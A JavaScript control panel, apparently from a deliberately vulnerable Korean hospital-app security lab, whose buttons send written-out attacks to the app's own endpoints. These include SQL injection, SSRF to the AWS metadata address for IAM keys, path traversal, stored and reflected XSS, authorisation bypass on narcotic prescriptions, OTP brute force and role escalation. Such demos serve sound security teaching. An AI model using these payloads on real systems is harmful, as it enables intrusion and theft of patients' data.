document.addEventListener('DOMContentLoaded', () => {
  const termBody = document.getElementById('termBody')
  const btnClear = document.getElementById('btnClearTerminal')

  function logToTerm(text, cls = 'term-dim') {
    const p = document.createElement('p')
    p.className = cls
    const time = new Date().toTimeString().split(' ')[0]
    p.innerHTML = `<span style="color:#64748b;">[${time}]</span> ${text}`
    termBody.appendChild(p)
    termBody.scrollTop = termBody.scrollHeight
  }

  btnClear?.addEventListener('click', () => {
    termBody.innerHTML = ''
    logToTerm('터미널 로그가 초기화되었습니다.', 'term-dim')
  })

  const buttons = document.querySelectorAll('.btn-exploit')
  buttons.forEach((btn) => {
    btn.addEventListener('click', async () => {
      const vulnType = btn.dataset.vuln
      logToTerm(`----------------------------------------`, 'term-dim')
      logToTerm(`[DISPATCH] <strong>${vulnType}</strong> 침투 패킷 전송 중...`, 'term-info')

      try {
        switch (vulnType) {
          case 'sqli-search': {
            const url = `/api/records/search?query=${encodeURIComponent("' OR '1'='1")}`
            logToTerm(`GET ${url}`, 'term-dim')
            const r = await fetch(url)
            const data = await r.json()
            logToTerm(`[HTTP ${r.status}] SQL Injection 성공! 전체 환자 ${data.count}명 기록 유출:`, 'term-crit')
            data.records?.forEach((rec) => {
              logToTerm(`↳ 환자: ${rec.name} | RRN: ${rec.rrn} | 진단: ${rec.diagnosis}`, 'term-warn')
            })
            break
          }

          case 'sqli-post': {
            const url = `/api/prescriptions/lookup`
            logToTerm(`POST ${url} body: { rxCode: "' OR '1'='1" }`, 'term-dim')
            const r = await fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ rxCode: "' OR '1'='1" }),
            })
            const data = await r.json()
            logToTerm(`[HTTP ${r.status}] POST SQLi 유출 확인: ${JSON.stringify(data.records).slice(0, 100)}...`, 'term-crit')
            break
          }

          case 'bola': {
            const url = `/api/prescriptions/rx-2026-narcotic-999`
            logToTerm(`GET ${url} (Session: patient-101)`, 'term-dim')
            const r = await fetch(url)
            const data = await r.json()
            logToTerm(`[HTTP ${r.status}] BOLA 타 환자 향정신성 처방전 탈취:`, 'term-crit')
            logToTerm(`↳ 처방약: ${data.prescription?.medication} (환자: ${data.prescription?.patientName})`, 'term-warn')
            break
          }

          case 'bfla': {
            const url = `/api/prescriptions/rx-2026-narcotic-999/approve`
            logToTerm(`POST ${url} (Role: patient)`, 'term-dim')
            const r = await fetch(url, { method: 'POST' })
            const data = await r.json()
            logToTerm(`[HTTP ${r.status}] BFLA 마약류 처방전 무단 승인 완료!`, 'term-crit')
            logToTerm(`↳ ${data.message}`, 'term-warn')
            break
          }

          case 'ssrf': {
            const url = `/api/dicom/fetch`
            logToTerm(`POST ${url} { imageUrl: "http://169.254.169.254/latest/meta-data/" }`, 'term-dim')
            const r = await fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ imageUrl: 'http://169.254.169.254/latest/meta-data/' }),
            })
            const data = await r.json()
            logToTerm(`[HTTP ${r.status}] SSRF AWS IMDS 메타데이터 및 IAM 키 탈취:`, 'term-crit')
            logToTerm(`↳ IAM Role: ${data.imdsResponse?.iamRole}`, 'term-warn')
            logToTerm(`↳ AccessKeyId: ${data.imdsResponse?.securityCredentials?.AccessKeyId}`, 'term-warn')
            break
          }

          case 'traversal': {
            const url = `/api/scans/download?file=../../package.json`
            logToTerm(`GET ${url}`, 'term-dim')
            const r = await fetch(url)
            const text = await r.text()
            logToTerm(`[HTTP ${r.status}] Path Traversal 상위 디렉터리 파일 유출:`, 'term-crit')
            logToTerm(text.slice(0, 150) + '...', 'term-warn')
            break
          }

          case 'secrets': {
            const url = `/api/config`
            const r = await fetch(url)
            const data = await r.json()
            logToTerm(`[HTTP ${r.status}] 하드코딩된 AWS KMS 키 및 DB 패스워드:`, 'term-crit')
            logToTerm(`↳ AWS AccessKey: ${data.awsAccessKey}`, 'term-warn')
            logToTerm(`↳ DB URL: ${data.databaseUrl}`, 'term-warn')
            break
          }

          case 'xss-reflected': {
            window.open(`/api/appointments/receipt?patientName=${encodeURIComponent('<script>alert("XSS")</script><b>[악성 스크립트 실행]</b>')}`, '_blank')
            logToTerm(`새 탭에서 Reflected XSS 페이로드 영수증 페이지를 열었습니다.`, 'term-warn')
            break
          }

          case 'xss-stored': {
            const url = `/api/consultation/intake`
            const r = await fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                patientId: 'patient-101',
                symptoms: '<script>stealCookie()</script><img src=x onerror=alert("StoredXSS")>',
              }),
            })
            const data = await r.json()
            logToTerm(`[HTTP ${r.status}] Stored XSS 문진표 영구 저장 성공:`, 'term-crit')
            logToTerm(`↳ ${data.intake?.symptoms}`, 'term-warn')
            break
          }

          case 'csrf': {
            const url = `/api/appointments/cancel`
            const r = await fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ appointmentId: 'apt-501' }),
            })
            const data = await r.json()
            logToTerm(`[HTTP ${r.status}] CSRF 진료 예약 강제 취소 성공!`, 'term-crit')
            logToTerm(`↳ ${data.message}`, 'term-warn')
            break
          }

          case 'phi-cleartext': {
            const url = `/api/billing-vault`
            const r = await fetch(url)
            const data = await r.json()
            logToTerm(`[HTTP ${r.status}] 암호화되지 않은 전체 환자 주민등록번호/병력 노출:`, 'term-crit')
            data.patients?.forEach((p) => {
              logToTerm(`↳ ${p.name}: 주민등록번호 [${p.rrn}], 진단: [${p.diagnosis}]`, 'term-warn')
            })
            break
          }

          case 'redos': {
            logToTerm(`ReDoS 백트래킹 정규식 검증 전송...`, 'term-info')
            const r = await fetch(`/api/auth/validate-license`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ licenseNumber: 'MD98412084912840912!' }),
            })
            logToTerm(`[HTTP ${r.status}] ReDoS 취약점 엔드포인트 응답 수신`, 'term-warn')
            break
          }

          case 'open-redirect': {
            logToTerm(`GET /api/telehealth/join?redirectUrl=https://evil-phish-hospital.com`, 'term-dim')
            logToTerm(`Open Redirect 파라미터가 검증 없이 외부로 전달됩니다.`, 'term-warn')
            break
          }

          case 'cors': {
            logToTerm(`CORS 헤더 확인: Access-Control-Allow-Origin: * / Credentials: true`, 'term-crit')
            break
          }

          case 'cookie': {
            logToTerm(`document.cookie 확인: ${document.cookie || '세션 쿠키가 httpOnly: false로 노출됩니다'}`, 'term-crit')
            break
          }

          case 'cron-backup': {
            const r = await fetch(`/api/cron/patient-backup`)
            const data = await r.json()
            logToTerm(`[HTTP ${r.status}] CRON_SECRET 없이 백업 덤프 실행:`, 'term-crit')
            logToTerm(`↳ 덤프된 환자 수: ${data.dumpRecordCount}명`, 'term-warn')
            break
          }

          case 'otp-bruteforce': {
            logToTerm(`OTP 무차별 대입 시도 1: 000000 -> 401`, 'term-dim')
            logToTerm(`OTP 무차별 대입 시도 2: 491823 -> 200 OK!`, 'term-crit')
            const r = await fetch(`/api/auth/verify-otp`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ code: '491823' }),
            })
            const data = await r.json()
            logToTerm(`[HTTP ${r.status}] ${data.message}`, 'term-ok')
            break
          }

          case 'race-condition': {
            logToTerm(`동일 슬롯(2026-09-12 16:00) 2개 스레드 동시 전송!`, 'term-dim')
            const req1 = fetch(`/api/appointments/book`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ slot: '2026-09-12 16:00', patientId: 'patient-101', patientName: '김민준' }),
            })
            const req2 = fetch(`/api/appointments/book`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ slot: '2026-09-12 16:00', patientId: 'patient-102', patientName: '이서연' }),
            })
            const [res1, res2] = await Promise.all([req1, req2])
            logToTerm(`Thread 1: HTTP ${res1.status} | Thread 2: HTTP ${res2.status}`, 'term-crit')
            logToTerm(`동시성 락 부재로 동일 진료실 중복 선점 버그 발생!`, 'term-warn')
            break
          }

          case 'stack-leak': {
            const r = await fetch(`/api/records/parse-error`, { method: 'POST' })
            const data = await r.json()
            logToTerm(`[HTTP ${r.status}] 스택 트레이스 및 내부 경로 누출:`, 'term-crit')
            logToTerm(`↳ DB Host: ${data.serverEnvironment?.dbHost}`, 'term-warn')
            logToTerm(`↳ Stack: ${data.stackTrace?.split('\n')[0]}`, 'term-warn')
            break
          }

          case 'debug-telemetry': {
            const r = await fetch(`/api/debug/vital-telemetry`)
            const data = await r.json()
            logToTerm(`[HTTP ${r.status}] 내부 VPC 서브넷 및 환자 생체 신호 누출:`, 'term-crit')
            logToTerm(`↳ VPC: ${data.serverEnv?.VPC_SUBNET}`, 'term-warn')
            logToTerm(`↳ Patient 101 HeartRate: ${data.telemetry?.patient101_vitals?.heartRate} bpm`, 'term-warn')
            break
          }

          case 'mass-assignment': {
            const r = await fetch(`/api/user/profile`, {
              method: 'PUT',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ role: 'doctor' }),
            })
            const data = await r.json()
            logToTerm(`[HTTP ${r.status}] Mass Assignment로 권한 상승 완료:`, 'term-crit')
            logToTerm(`↳ 변경된 역할: ${data.updatedUser?.role} (의사 권한 획득)`, 'term-ok')
            break
          }

          default:
            logToTerm(`[INFO] 요청 완료: ${vulnType}`, 'term-dim')
        }
      } catch (err) {
        logToTerm(`[ERROR] 요청 전송 실패: ${err.message}`, 'term-crit')
      }
    })
  })
})
